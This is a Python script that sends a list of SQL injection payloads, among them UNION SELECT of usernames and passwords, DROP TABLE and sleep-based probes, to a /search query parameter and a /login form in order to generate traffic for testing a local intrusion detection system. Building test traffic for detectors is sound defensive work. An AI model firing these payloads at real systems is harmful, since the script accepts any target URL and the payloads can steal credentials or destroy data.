"""
Controlled SQL Injection traffic test for local IDS validation.

Sends common SQLi payload patterns as HTTP requests against a
LOCAL target you control. Your test_web_app.py has no real
database behind it, so no actual injection occurs — this is
purely about generating attack-shaped traffic for the IDS to
observe and classify.

ONLY use this against systems you own or have explicit
permission to test.
"""

import argparse
import time

import requests


# ============================================================
# COMMON SQLI PAYLOAD PATTERNS
# ============================================================
# Representative of what appears in CICIDS2017's Web Attack -
# SQL Injection samples: tautologies, UNION-based extraction
# attempts, comment injection, stacked queries.
# ============================================================

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "admin' --",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "'; DROP TABLE users--",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "' OR sleep(5)--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
]


def send_sqli_requests(base_url, delay):

    print("=" * 70)
    print("SQL INJECTION TRAFFIC TEST")
    print("=" * 70)
    print("Target:", base_url)
    print("Payloads:", len(SQLI_PAYLOADS))
    print("=" * 70)
    print()
    print("Starting in 3 seconds — make sure flow_capture.py is running...")
    time.sleep(3)

    results = {"success": 0, "failed": 0}

    for payload in SQLI_PAYLOADS:

        # Try the payload in a query parameter (GET-based injection,
        # e.g. against /search?q=...)
        try:
            response = requests.get(
                f"{base_url}/search",
                params={"q": payload},
                timeout=3
            )
            print(f"[GET /search] payload={payload!r} -> {response.status_code}")
            results["success"] += 1
        except Exception as error:
            print(f"[GET /search] payload={payload!r} -> FAILED ({error})")
            results["failed"] += 1

        time.sleep(delay)

        # Try the same payload as a POST form field (common for
        # login-form-based SQLi, e.g. against /login)
        try:
            response = requests.post(
                f"{base_url}/login",
                data={"username": payload, "password": payload},
                timeout=3
            )
            print(f"[POST /login] payload={payload!r} -> {response.status_code}")
            results["success"] += 1
        except Exception as error:
            print(f"[POST /login] payload={payload!r} -> FAILED ({error})")
            results["failed"] += 1

        time.sleep(delay)

    print()
    print("=" * 70)
    print("SQL INJECTION TEST COMPLETE")
    print("=" * 70)
    print("Requests sent:", results["success"])
    print("Requests failed:", results["failed"])


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description="Controlled SQL injection traffic test for local IDS validation."
    )

    parser.add_argument(
        "--target",
        default="http://127.0.0.1:8000",
        help="Base target URL (default: http://127.0.0.1:8000)"
    )

    parser.add_argument(
        "--delay",
        type=float,
        default=0.3,
        help="Delay in seconds between requests (default: 0.3)"
    )

    args = parser.parse_args()

    send_sqli_requests(args.target, args.delay)